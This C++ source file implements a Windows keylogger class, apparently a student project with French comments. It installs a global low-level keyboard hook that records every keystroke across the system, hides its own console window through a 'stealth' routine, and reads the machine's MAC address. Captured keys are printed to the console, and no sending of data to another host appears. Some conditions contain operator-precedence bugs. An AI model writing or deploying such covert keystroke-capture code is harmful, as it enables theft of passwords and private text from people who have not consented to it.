#include	"KeyLogger.hpp"
#include	<iphlpapi.h>
#include	<iomanip>

#pragma comment(lib, "IPHLPAPI.lib")

HHOOK hookKeyboard;
//HHOOK hookMouse;

WindowsKeyLogger::WindowsKeyLogger()
{
  this->capslock = false;
  this->shift = false;
}

WindowsKeyLogger::~WindowsKeyLogger()
{
}

void WindowsKeyLogger::stealth()
{
  HWND stealth;

  AllocConsole();
  stealth = FindWindow("KeyLoggerWindow", nullptr);
  ShowWindow(stealth, 0);
}

bool WindowsKeyLogger::check_upper()
{
  if (this->shift && this->capslock)
    return (false);
  else if (this->shift || this->capslock)
    return (true);
  else
    return (false);
}

void WindowsKeyLogger::initHooks()
{
  if (hookKeyboard)
    UnhookWindowsHookEx(hookKeyboard);
  hookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(handleKeyboard), nullptr, 0);
  //if (hookMouse)
    //UnhookWindowsHookEx(hookMouse);
  //this->hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
}

void WindowsKeyLogger::unHooks()
{
  if (hookKeyboard)
    UnhookWindowsHookEx(hookKeyboard);
  //if (hookMouse)
    //UnhookWindowsHookEx(hookMouse);
}

void WindowsKeyLogger::getMacAddr()
{
  IP_ADAPTER_INFO	AdapterInfo[16];
  PIP_ADAPTER_INFO 	pAdapterInfo;
  DWORD  		buffer;
  DWORD			status;
  char			mac_addr[18];
  buffer = sizeof(AdapterInfo);
  status = GetAdaptersInfo(AdapterInfo, &buffer);
  if (status == ERROR_SUCCESS)
  {
    pAdapterInfo = AdapterInfo;
   std::cout  << std::hex << std::uppercase << std::setfill('0') <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[0]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[1]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[2]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[3]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[4]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]) << std::endl;
  }
  else
  {
    std::cout << "Impossible to resolve the mac address" << std::endl;
  }
}

LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
{
  PKBDLLHOOKSTRUCT 	content;
  char 			tmp[0xFF] = {0};
  std::string 		str;
  DWORD 		msg;
  bool			shift;
  bool			capslock;
  short			value;

  //faire un tableau de correspondance pour les premières touches du clavier qui ont une majuscule différente.
  // je choisis le clavier sur lequel je vais faire mes correspondances
  // Prendre azerty dans un premier temps
  shift = false;
  if (GetAsyncKeyState(VK_SHIFT))
    shift = true;
  value = GetKeyState(VK_CAPITAL);
  if (value & 1 == 1)
    capslock = true;
  else
    capslock = false;
  msg = 1;
  if ((code == HC_ACTION) && wp == WM_SYSKEYUP || wp == WM_KEYUP)
  {
    content = reinterpret_cast<PKBDLLHOOKSTRUCT >(lp);
    if (content->vkCode == VK_SHIFT)
      shift = false;
  }
  if ((code == HC_ACTION) && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
  {
    content = reinterpret_cast<PKBDLLHOOKSTRUCT>(lp);
    msg += (content->scanCode << 16);
    msg += (content->flags << 24);
    GetKeyNameText(msg, tmp, 0xFF);
    str = static_cast<std::string>(tmp);
    if (str.length() <= 1)
    {
      str = tolower(str[0]);
      if (shift == true ^ capslock == true)
	str = toupper(str[0]);
     std::cout << str;
    }
    else
    {
      try
      {
	str = WindowsKeyLogger::keys.at(content->vkCode);
	if (str == "Caps Lock")
	  capslock = !capslock;
	std::cout << str;
      }
      catch (std::out_of_range const &)
      {
	std::cout << "NOT FOUND";
      }
    }
  }
  return CallNextHookEx(hookKeyboard, code, wp, lp);
}